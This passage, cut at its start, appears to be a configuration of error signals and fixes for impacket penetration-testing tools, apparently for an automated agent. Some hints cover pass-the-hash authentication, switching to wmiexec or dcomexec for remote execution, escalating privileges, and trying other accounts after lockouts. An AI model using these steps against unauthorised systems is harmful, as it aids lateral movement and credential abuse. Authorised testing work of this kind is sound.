    remediation: "DNS resolution failed. Use IP directly, or pre-add the host to /etc/hosts via cli_in_container's --add-host equivalent."
  - signal: "timed out"
    remediation: "TCP / RPC timeout (impacket reports as '[Errno Connection error (host:port)] timed out'). Target may be slow, filtered, or down. Verify with nmap -p<port> and check VPN routing. Some binaries accept -timeout SECONDS to extend."
  - signal: "SessionError: code: 0x"
    remediation: "Generic SMB session error. Check the hex code: 0xc0000022 = STATUS_ACCESS_DENIED, 0xc000006d = STATUS_LOGON_FAILURE, 0xc0000034 = STATUS_OBJECT_NAME_NOT_FOUND."
  - signal: "Errors connecting to MS-SAMR endpoint"
    remediation: "lookupsid / samrdump cannot bind to SAMR. Some hardened targets block SAMR over SMB to non-admin users. Try with admin creds."
  - signal: "raise NoMechanismFoundError"
    remediation: "Kerberos library failed to find a valid auth mechanism. Usually means -k was specified without a valid ccache. Run getTGT first."
  - signal: "KDC_ERR_CLIENT_REVOKED"
    remediation: "Account is locked or disabled at the KDC. Try a different account; cannot retry until admin unlocks/enables."
  - signal: "KDC_ERR_KEY_EXPIRED"
    remediation: "Password has expired. Use impacket-changepasswd to set a new one before further auth."
  - signal: "KDC_ERR_ETYPE_NOSUPP"
    remediation: "Encryption type not supported by the DC. Try -aesKey instead of -hashes (or vice versa); some DCs reject RC4 or only allow AES."
  - signal: "STATUS_PASSWORD_MUST_CHANGE"
    remediation: "Password must be changed before next logon. Use impacket-changepasswd before retrying."
  - signal: "STATUS_SHARING_VIOLATION"
    remediation: "File is locked by another process. Retryable — wait and re-run."
  - signal: "STATUS_BAD_NETWORK_NAME"
    remediation: "Share name not found. Run impacket-smbclient 'shares' to enumerate available shares."
  - signal: "is not writable"
    remediation: "PsExec found NO writable share — the user lacks local-admin rights on the target. Switch to wmiexec/dcomexec (no share write needed) or escalate first."

